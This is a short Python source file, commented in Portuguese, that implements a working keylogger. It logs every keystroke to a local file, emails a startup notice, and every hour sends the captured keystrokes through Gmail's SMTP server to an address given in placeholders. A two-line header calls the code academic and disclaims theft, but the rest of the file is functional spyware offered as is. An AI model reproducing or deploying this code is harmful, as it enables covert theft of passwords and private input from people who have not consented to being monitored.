#atenção, esse código foi criado e comartilhado com intenções acadêmicas
#não é encorajado usar o código a seguir para roubo de informações de qualquer natureza.

import time
import keyboard
import smtplib
from email.message import EmailMessage

# Captura teclas e salva no arquivo
def capturar_teclas():
    evento = keyboard.read_event()
    tecla = evento.name
    if evento.event_type == 'down':
        with open('registro.txt', 'a', encoding='utf-8') as arquivo:
            if tecla == "space":
                tecla = " "
            elif tecla == "enter":
                tecla = "\n"
            elif len(tecla) > 1 and tecla != "space":
                tecla = f"<{tecla}>"
            arquivo.write(tecla)

# Envia um e-mail simples ao iniciar o programa
def enviar_email_check():
    msg = EmailMessage()
    msg.set_content("Conexão iniciada")
    msg['Subject'] = 'Status'
    msg['From'] = remetente
    msg['To'] = destinatarios[0]

    with smtplib.SMTP('smtp.gmail.com', 587) as servidor:
        servidor.starttls()
        servidor.login(remetente, senha)
        servidor.send_message(msg)

# Envia o conteúdo do arquivo registro.txt
def enviar_email():
    with open('registro.txt', 'r', encoding='utf-8') as arquivo:
        conteudo = arquivo.read()

    msg = EmailMessage()
    msg.set_content(conteudo)
    msg['Subject'] = 'Registro de Teclas'
    msg['From'] = remetente
    msg['To'] = destinatarios[0]

    with smtplib.SMTP('smtp.gmail.com', 587) as servidor:
        servidor.starttls()
        servidor.login(remetente, senha)
        servidor.send_message(msg)

# Configurações de e-mail
remetente = 'email que envia o log'
senha = 'senha e-mail aqui'  # senha de app
destinatarios = ['email que vai receber o log']

# Loop principal
ultimo_envio = time.time()
enviar_email_check()

while True:
    capturar_teclas()
    if time.time() - ultimo_envio > 3600: 
        enviar_email()
        ultimo_envio = time.time()